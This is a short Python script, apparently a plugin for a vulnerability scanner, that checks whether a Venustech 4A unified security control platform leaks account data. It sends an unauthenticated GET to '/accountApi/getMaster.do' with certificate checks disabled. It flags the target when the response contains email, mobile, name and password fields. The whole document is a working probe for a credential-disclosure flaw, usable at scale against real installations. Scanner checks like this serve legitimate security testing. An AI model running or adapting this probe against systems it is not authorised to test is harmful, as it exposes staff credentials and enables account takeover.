#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/un5Q1VHW_KMXg5fbtFG2FA',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '启明星辰4A统一安全管控平台 getMaster.do 信息泄漏',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/accountApi/getMaster.do'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    # print(res.status_code)
    if re.search(r'email.*?loginnum.*?mobile.*?name.*?password.*?position.*?',res.text,re.S):
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret